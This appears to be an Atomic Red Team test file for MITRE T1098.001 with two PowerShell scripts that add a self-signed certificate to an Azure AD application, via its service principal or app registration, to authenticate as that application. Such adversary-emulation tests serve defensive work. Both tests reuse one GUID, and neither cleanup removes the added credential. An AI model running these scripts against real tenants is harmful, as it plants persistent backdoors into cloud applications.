attack_technique: T1098.001
display_name: Additional Cloud Credentials
atomic_tests:
- name: Azure AD Application Hijacking - Service Principal
  auto_generated_guid: b8e747c3-bdf7-4d71-bce2-f1df2a057406
  description: |
    Add a certificate to an Application through its Service Principal.
    The certificate can then be used to authenticate as the application and benefit from its rights.
    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Azure AD username
      type: String
    password:
      description: Azure AD password
      type: String
    application:
      description: Targeted Application
      type: String
      default: "SuperApplication"
    CertificatePassword:
      description: Password of the new certificate
      type: string
      default: Passw0rd
    PathToCert:
      description: Path of the new certificate, locally stored 
      type: string
  executor:
    command: |
      $User = "#{username}"
      $App_name = "#{application}"
      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Pword
      Connect-AzureAD -Credential $Credential

      $sp = Get-AzureADServicePrincipal -Searchstring $App_name
      $pwd = "#{CertificatePassword}"
      # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
      $notAfter = (Get-Date).AddDays(1) 
      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\LocalMachine\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
      $pwd = ConvertTo-SecureString -String $pwd -Force -AsPlainText
      Export-PfxCertificate -cert "cert:\localmachine\my\$thumb" -FilePath #{PathToCert}#{application}'.pfx' -Password $pwd

      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(#{PathToCert}#{application}'.pfx', $pwd)
      $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

      New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -CustomKeyIdentifier "Test123" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $notAfter

    cleanup_command: |
      Disconnect-AzureAD
    name: powershell
    elevation_required: true

- name: Azure AD Application Hijacking - App Registration
  auto_generated_guid: b8e747c3-bdf7-4d71-bce2-f1df2a057406
  description: |
    Add a certificate to an Application through its App Registration.
    The certificate can then be used to authenticate as the application and benefit from its rights.
    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Azure AD username
      type: String
    password:
      description: Azure AD password
      type: String
    application:
      description: Targeted Application 
      type: String
      default: "SuperApplication"
    CertificatePassword:
      description: Password of the new certificate
      type: string
      default: Passw0rd
    PathToCert:
      description: Path of the new certificate, locally stored 
      type: string
  executor:
    command: |
      $User = "#{username}"
      $App_name = "#{application}"
      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Pword
      Connect-AzureAD -Credential $Credential

      $app = Get-AzureADApplication -Searchstring $App_name
      $pwd = "#{CertificatePassword}"
      $notAfter = (Get-Date).AddMonths(6) 
      $thumb = (New-SelfSignedCertificate -DnsName "drumkit.onmicrosoft.com" -CertStoreLocation "cert:\LocalMachine\My"  -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
      $pwd = ConvertTo-SecureString -String $pwd -Force -AsPlainText
      Export-PfxCertificate -cert "cert:\localmachine\my\$thumb" -FilePath #{PathToCert}#{application}'.pfx' -Password $pwd

      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(#{PathToCert}#{application}'.pfx', $pwd)
      $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

      New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -CustomKeyIdentifier "Test123" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $notAfter

    cleanup_command: |
      Disconnect-AzureAD
    name: powershell
    elevation_required: true
    
